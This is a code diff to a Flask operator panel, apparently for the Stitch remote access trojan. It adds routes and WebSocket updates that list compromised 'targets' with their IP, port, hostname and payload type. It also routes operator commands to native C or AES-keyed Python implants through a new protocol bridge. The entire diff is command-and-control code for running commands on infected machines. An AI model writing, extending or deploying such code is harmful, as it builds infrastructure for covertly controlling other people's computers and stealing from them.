@@ -57,6 +57,8 @@ from auth_utils import (
     track_failed_login, is_login_locked, get_lockout_time_remaining,
     clear_failed_login_attempts
 )
+# Import native protocol bridge for C payload support
+from native_protocol_bridge import native_bridge, send_command_to_native_payload
 
 # ============================================================================
 # Configuration - Now loaded from Config module
@@ -657,6 +659,52 @@ def get_command_definitions():
             'success': True,
             'definitions': COMMAND_DEFINITIONS
         })
+    except Exception as e:
+        return jsonify({'success': False, 'error': str(e)}), 500
+
+@app.route('/api/targets', methods=['GET'])
+@login_required
+@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")
+def get_targets():
+    """Get list of connected targets from Stitch server"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        targets = sync_stitch_targets()
+        
+        return jsonify({
+            'success': True,
+            'targets': targets,
+            'count': len(targets),
+            'timestamp': datetime.now().isoformat()
+        })
+        
+    except Exception as e:
+        log_debug(f"Error getting targets: {str(e)}", "ERROR", "API")
+        return jsonify({'success': False, 'error': str(e)}), 500
+        
+@app.route('/api/targets/active', methods=['GET'])
+@login_required
+@limiter.limit(f"{API_POLLING_PER_HOUR} per hour")
+def get_active_targets():
+    """Get only ONLINE targets (for polling)"""
+    try:
+        metrics_collector.increment_counter('api_requests')
+        server = get_stitch_server()
+        
+        targets = []
+        for target_id in server.inf_sock.keys():
+            targets.append({
+                'id': target_id,
+                'status': 'online',
+                'last_seen': time.time()
+            })
+            
+        return jsonify({
+            'success': True,
+            'targets': targets,
+            'count': len(targets)
+        })
+        
     except Exception as e:
         return jsonify({'success': False, 'error': str(e)}), 500
 
@@ -1572,6 +1620,62 @@ def _perform_handshake(sock, addr):
     except Exception as e:
         logger.error(f"Handshake error: {e}")
         return False, None, str(e)
+        
+def sync_stitch_targets():
+    """
+    Synchronize Stitch server connections with web app state
+    Returns list of connected targets for UI
+    """
+    try:
+        server = get_stitch_server()
+        targets = []
+        
+        for target_id, sock in server.inf_sock.items():
+            # Get or create connection context
+            if target_id not in connection_context:
+                # Detect payload type
+                payload_type = native_bridge.detect_payload_type(sock)
+                
+                # Create basic context
+                connection_context[target_id] = {
+                    'id': target_id,
+                    'ip': target_id.split(':')[0] if ':' in target_id else target_id,
+                    'port': target_id.split(':')[1] if ':' in target_id else 'unknown',
+                    'connected_at': time.time(),
+                    'last_seen': time.time(),
+                    'payload_type': payload_type,
+                    'os': f'{payload_type.capitalize()} Payload',
+                    'hostname': target_id,
+                    'user': 'unknown',
+                    'status': 'online'
+                }
+                
+                log_debug(f"New target detected: {target_id} ({payload_type})", "INFO", "Sync")
+                
+            # Update last seen
+            connection_context[target_id]['last_seen'] = time.time()
+            connection_context[target_id]['status'] = 'online'
+            
+            # Add to targets list
+            ctx = connection_context[target_id]
+            targets.append({
+                'id': target_id,
+                'ip': ctx.get('ip'),
+                'port': ctx.get('port'),
+                'hostname': ctx.get('hostname'),
+                'os': ctx.get('os'),
+                'user': ctx.get('user'),
+                'payload_type': ctx.get('payload_type'),
+                'connected_at': ctx.get('connected_at'),
+                'last_seen': ctx.get('last_seen'),
+                'status': 'online'
+            })
+            
+        return targets
+        
+    except Exception as e:
+        log_debug(f"Error syncing targets: {str(e)}", "ERROR", "Sync")
+        return []
 
 def execute_real_command(command, conn_id=None, parameters=None):
     """Execute command - REAL implementation, not simulated
@@ -1614,19 +1718,38 @@ def execute_real_command(command, conn_id=None, parameters=None):
         # Get the socket and execute command on target
         target_socket = server.inf_sock[conn_id]
         
-        # Get AES key for this connection
-        conn_aes_key = get_connection_aes_key(conn_id)
-        if not conn_aes_key:
-            return f"❌ No AES encryption key found for {conn_id}.\n\nUse 'addkey' to add the key first."
+        # Detect payload type (native C or Python)
+        is_native = native_bridge.is_native_payload(conn_id, connection_context)
         
-        # Execute command on target using stitch_lib with parameters and record metrics
         start_time = time.time()
-        output = execute_on_target(target_socket, command, conn_aes_key, conn_id, parameters)
+        
+        if is_native:
+            # Native C payload - use protocol bridge
+            log_debug(f"Detected native C payload for {conn_id}", "INFO", "Protocol")
+            success, output = send_command_to_native_payload(target_socket, command)
+            
+            if success:
+                result_output = f"✅ Command executed on native payload\n\n{output}"
+            else:
+                result_output = f"❌ Native command failed: {output}"
+                
+        else:
+            # Python Stitch payload - use existing stitch_lib
+            log_debug(f"Detected Python Stitch payload for {conn_id}", "INFO", "Protocol")
+            
+            # Get AES key for this connection
+            conn_aes_key = get_connection_aes_key(conn_id)
+            if not conn_aes_key:
+                return f"❌ No AES encryption key found for {conn_id}.\n\nUse 'addkey' to add the key first."
+            
+            # Execute command on target using stitch_lib with parameters
+            result_output = execute_on_target(target_socket, command, conn_aes_key, conn_id, parameters)
+        
         duration = time.time() - start_time
         metrics_collector.increment_counter('total_commands')
         metrics_collector.record_duration('command_duration', duration)
         
-        return output
+        return result_output
         
     except Exception as e:
         metrics_collector.increment_counter('command_errors')
@@ -2288,6 +2411,17 @@ def handle_connect():
     # request.sid is available in SocketIO context
     log_debug(f"WebSocket connected: {request.sid}", "INFO", "WebSocket")
     emit('connection_status', {'status': 'connected'})
+    
+    # Send current targets immediately
+    try:
+        targets = sync_stitch_targets()
+        emit('targets_update', {
+            'targets': targets,
+            'count': len(targets),
+            'timestamp': datetime.now().isoformat()
+        })
+    except Exception as e:
+        log_debug(f"Error sending initial targets: {str(e)}", "ERROR", "WebSocket")
 
 @socketio.on('disconnect')
 def handle_disconnect():
@@ -2316,6 +2450,15 @@ def monitor_connections():
         try:
             server = get_stitch_server()
             active_count = len(server.inf_sock)
+            
+            # Synchronize targets and broadcast to UI
+            targets = sync_stitch_targets()
+            socketio.emit('targets_update', {
+                'targets': targets,
+                'count': len(targets),
+                'timestamp': datetime.now().isoformat()
+            })
+            
             # Clean up connection_context entries for dropped connections
             active_ips = set(server.inf_sock.keys())
             for ip in list(connection_context.keys()):
